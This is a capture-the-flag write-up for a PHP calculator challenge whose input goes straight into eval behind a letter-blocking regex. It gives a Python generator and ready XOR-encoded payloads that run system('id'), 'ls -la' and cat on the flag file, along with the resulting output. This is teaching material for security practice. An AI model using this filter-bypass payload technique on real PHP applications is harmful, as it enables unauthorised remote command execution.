# Challenge Name: Warmup


![date](https://img.shields.io/badge/date-26.02.2023-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)   
![value](https://img.shields.io/badge/value-50-blue.svg)  


## Description

Just another Warmup challenge to test your skills :)

[https://ideh-warmup1.chals.io](https://ideh-warmup1.chals.io/)

**Author** : c3p0d4y

## Detailed solution 

We have a calculator app 

![image](https://user-images.githubusercontent.com/72421091/221652421-55201441-512c-4a2a-a988-302d88bb391d.png)

Let's check the source code [source.zip](source.zip)

```php
        <?php
                if(isset($_POST['submit'])){
                        $expression = $_POST['expression'];

                        if(preg_match("/[A-Za-z`]+/", $expression)){
                                echo "Error: Invalid input";
                        }
                        else{
                                $result = eval("return ".$expression.";");
                                if($result === false){
                                        echo "Error: Invalid expression";
                                }
                                else{
                                        echo "Result: ".$result;
                                }
                        }
                }
        ?>
```

Our input is controlled by a preg_match with a regex [A-Za-z`]

As we can seem, our input ($expression) is being used in eval function

We need bypass the preg_match regex and try to inject data to perform command execuction

There is a known technique with **xor** to generate alphabets from no alphabetic characters, For example : 

```
echo ('3'^'@'); => s
```

For code execution, we need to put our payload in a format that can be executed

```
echo ("system(whoami)"); => print the string "system(whoami)"
echo ("system")("whoami"); => execute system(whoami)
```

So now, we need a code for : 

- finding two characters (no A-Z a-z ') that can be xored and give us the character needed for our payload
- put the payload in a format ("system")("whoami")

```python
chars = "0123456789!#$%&'()*+,-./:;<=>?@[]^_{|}.~" # no A-Za-z " \ ~

def xor(code):
    xor_code = ""
    for i in code:
        for j in chars:
            bypass_code = False
            for k in chars:
                if ord(j) ^ ord(k) == ord(i):
                    xor_code += f".('{j}'^'{k}')"
                    bypass_code = True
                if bypass_code:
                    break
            if bypass_code:
                break
        if not bypass_code:
            xor_code += f".'{i}'"
    xor_code = f"({xor_code[1:]})"
    return xor_code

print(xor("system")+xor("id"))
```

The output for ("system")("id")

```
(('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('0'^']'))(('2'^'[').('9'^']'))
```

Check the payload with our app 

As we can see, we have the output for `id` command. We are the www-data user 

Now let's generate a payload for listing files `("system")("ls -la")`  

```
(('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('0'^']'))(('1'^']').('3'^'@').('['^'{').'-'.('1'^']').('!'^'@'))
```

![image](https://user-images.githubusercontent.com/72421091/221719510-af6fe61b-a8d3-43e2-93ba-55232d4b2d42.png)  

We have a listing for files 

```
        total 28
drwxrwxrwx 1 www-data www-data 4096 Feb 25 15:23 .
drwxr-xr-x 1 root     root     4096 Nov 15 04:13 ..
-rw-rw-r-- 1 root     root       82 Feb 25 15:21 Dockerfile
-rw-rw-r-- 1 root     root     1341 Feb 23 14:07 index.php
-rw-rw-r-- 1 root     root     4324 Feb 23 13:55 style.css
-rw-rw-r-- 1 root     root       33 Feb 21 10:29 warMup_pHp_cH4113n9e_1d3h23
Result: -rw-rw-r-- 1 root     root       33 Feb 21 10:29 warMup_pHp_cH4113n9e_1d3h23
```

Now we need to read the flag file `warMup_pHp_cH4113n9e_1d3h23`   

`("system")("cat warMup_pHp_cH4113n9e_1d3h23")` 

```
(('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('0'^']'))(('8'^'[').('!'^'@').('4'^'@').('['^'{').('7'^'@').('!'^'@').('2'^'@').('0'^'}').('5'^'@').('0'^'@').('!'^'~').('0'^'@').('3'^'{').('0'^'@').('!'^'~').('8'^'[').('3'^'{').'4'.'1'.'1'.'3'.('0'^'^').'9'.('8'^']').('!'^'~').'1'.('9'^']').'3'.('3'^'[').'2'.'3')
```

We got our flag 

![image](https://user-images.githubusercontent.com/72421091/221719855-6a49db59-9cd8-4b5d-9fd4-58f02e96f4d7.png)

## Flag

```
IDEH{warMup_pHp_cH4113n9e_1d3h23}
```
